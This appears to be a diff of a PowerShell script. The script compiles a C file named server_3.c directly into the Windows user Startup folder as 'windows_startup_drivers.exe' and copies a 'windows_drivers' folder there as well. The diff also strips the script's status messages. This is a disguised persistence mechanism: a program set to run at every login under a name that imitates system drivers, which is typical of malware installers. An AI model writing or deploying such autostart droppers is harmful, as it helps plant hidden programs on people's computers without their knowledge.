@@ -1,24 +1,10 @@
-# Source file or folder path
-$sourcePath = "windows_startup_drivers.exe"
 
-# Destination folder (startup folder) path
 $destinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows_startup_drivers.exe"
 
-# Copy the file or folder to the startup folder
-Copy-Item -Path $sourcePath -Destination $destinationPath -Force -Recurse
+gcc server_3.c -lwinmm -o $destinationPath2
 
-if ($?) {
-    Write-Host "File or folder copied successfully to startup folder."
-} else {
-    Write-Host "Failed to copy file or folder to startup folder."
-}
-
-$sourcePath = "windows_startup"
+$sourcePath = "windows_drivers"
 
 Copy-Item -Path $sourcePath -Destination $destinationPath -Force -Recurse
 
-if ($?) {
-    Write-Host "File or folder copied successfully to startup folder."
-} else {
-    Write-Host "Failed to copy file or folder to startup folder."
-}
